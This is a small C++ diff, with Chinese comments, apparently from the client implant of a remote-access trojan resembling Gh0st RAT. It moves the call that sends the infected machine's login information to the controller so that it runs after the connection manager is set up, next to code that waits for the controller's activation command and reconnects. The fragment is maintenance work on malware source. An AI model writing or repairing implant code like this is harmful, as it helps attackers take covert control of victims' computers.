@@ -84,9 +84,11 @@ DWORD WINAPI main(char *lpServiceName)
 		}
 		// 登录
 		DWORD dwExitCode = SOCKET_ERROR;
-		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
 		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
 		socketClient.setManagerCallBack(&manager);
+		
+		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
+		
 
 		//////////////////////////////////////////////////////////////////////////
 		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
